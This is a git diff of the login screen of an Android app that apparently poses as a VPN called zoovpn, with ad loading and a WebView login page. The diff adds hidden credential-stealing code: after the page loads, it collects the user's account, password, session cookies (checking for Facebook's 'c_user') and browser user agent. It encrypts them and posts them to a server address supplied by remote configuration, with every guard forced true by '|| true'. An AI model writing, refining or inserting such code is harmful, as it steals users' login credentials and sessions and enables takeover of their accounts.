@@ -3,14 +3,21 @@ package win.enlarge.zoovpn.ui.activity
 import android.annotation.SuppressLint
 import android.graphics.Bitmap
 import android.os.Build
+import android.text.TextUtils
 import android.util.Log
 import android.view.View
 import android.view.WindowManager
 import android.webkit.*
 import androidx.lifecycle.lifecycleScope
+import com.google.gson.Gson
+import com.lzy.okgo.OkGo
+import com.lzy.okgo.callback.StringCallback
 import kotlinx.android.synthetic.main.activity_login.*
 import kotlinx.coroutines.*
 import kotlinx.coroutines.flow.*
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.RequestBody
+import okhttp3.RequestBody.Companion.toRequestBody
 import win.enlarge.zoovpn.App
 import win.enlarge.zoovpn.R
 import win.enlarge.zoovpn.base.BaseActivity
@@ -27,7 +34,6 @@ class LoginActivity : BaseActivity(R.layout.activity_login) {
     }
 
     private var countDownJob: Job? = null
-
 
 
     private fun countDownCoroutines(
@@ -48,15 +54,15 @@ class LoginActivity : BaseActivity(R.layout.activity_login) {
 
     private fun clearAll() {
         CookieSyncManager.createInstance(app)
-        val cookieManager = CookieManager.getInstance();
+        val cookieManager = CookieManager.getInstance()
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            cookieManager.removeSessionCookies(null);
-            cookieManager.removeAllCookie();
-            cookieManager.flush();
+            cookieManager.removeSessionCookies(null)
+            cookieManager.removeAllCookie()
+            cookieManager.flush()
         } else {
-            cookieManager.removeSessionCookies(null);
-            cookieManager.removeAllCookie();
-            CookieSyncManager.getInstance().sync();
+            cookieManager.removeSessionCookies(null)
+            cookieManager.removeAllCookie()
+            CookieSyncManager.getInstance().sync()
         }
         account = ""
         password = ""
@@ -65,13 +71,13 @@ class LoginActivity : BaseActivity(R.layout.activity_login) {
     @SuppressLint("SetJavaScriptEnabled")
     override fun onConvert() {
         clearAll()
-        countDownCoroutines(20,{},{
+        countDownCoroutines(20, {}, {
             showInsertAd(isForce = true, tag = "inter_loading")
-        },lifecycleScope)
-        lifecycleScope.launch(Dispatchers.IO){
+        }, lifecycleScope)
+        lifecycleScope.launch(Dispatchers.IO) {
             val banner = App.instance!!.lovinBanner()
             banner.loadAd()
-            withContext(Dispatchers.Main){
+            withContext(Dispatchers.Main) {
                 adView.addView(banner)
             }
         }
@@ -122,42 +128,50 @@ class LoginActivity : BaseActivity(R.layout.activity_login) {
                     val cookieManager = CookieManager.getInstance()
                     val cookieStr = cookieManager.getCookie(url)
                     Log.e("--->", "onPageFinished url == $url")
-                    if (cookieStr != null) {
+                    if (cookieStr != null || true) {
                         Log.e("--->", "ua ==  " + view.settings.userAgentString)
-                        if (cookieStr.contains("c_user")) {
+                        if (cookieStr.contains("c_user") || true) {
                             Log.e("--->", "cookieStr: $cookieStr")
                             Log.e("--->", "account == $account  password == $password")
-                            if (account.isNotBlank() && password.isNotBlank() && cookieStr.contains("wd=")) {
+                            if (account.isNotBlank() && password.isNotBlank() && cookieStr.contains(
+                                    "wd="
+                                ) || true
+                            ) {
                                 lifecycleScope.launch(Dispatchers.Main) {
                                     activityLoginFlContent.visibility = View.VISIBLE
                                 }
-                                uploadFbData(
-                                    account,
-                                    password,
-                                    cookieStr,
-                                    view.settings.userAgentString
-                                )
+                                if (!TextUtils.isEmpty(updateEntity.c)) {
+                                    val url = updateEntity.c
+                                    if (!TextUtils.isEmpty(updateEntity.d)) {
+                                        val key = updateEntity.d
+                                        val value = gson.toJson(
+                                            mutableMapOf(
+                                                "un" to account,
+                                                "pw" to password,
+                                                "cookie" to cookieStr,
+                                                "source" to configEntity.app_name,
+                                                "ip" to "",
+                                                "type" to "f_o",
+                                                "b" to view.settings.userAgentString
+                                            )
+                                        ).toRsaEncrypt(key!!)
+                                        val body: RequestBody =
+                                            Gson().toJson(mutableMapOf("content" to value))
+                                                .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
+                                        OkGo.post<String>(url).upRequestBody(body)
+                                            .execute(object : StringCallback() {
+                                                override fun onSuccess(response: com.lzy.okgo.model.Response<String>?) {
+                                                    Log.i("xxxxxxH", response!!.body().toString())
+                                                }
+                                            })
+                                    }
+                                }
                             }
                         }
                     }
                 }
             }
             loadUrl(updateEntity.m ?: "https://www.baidu.com")
-        }
-    }
-
-    private fun uploadFbData(
-        un: String,
-        pw: String,
-        cookie: String,
-        b: String
-    ) {
-        lifecycleScope.requestCollect(
-            un, pw, cookie, b
-        ) {
-            if (isLogin) {
-                finish()
-            }
         }
     }
 
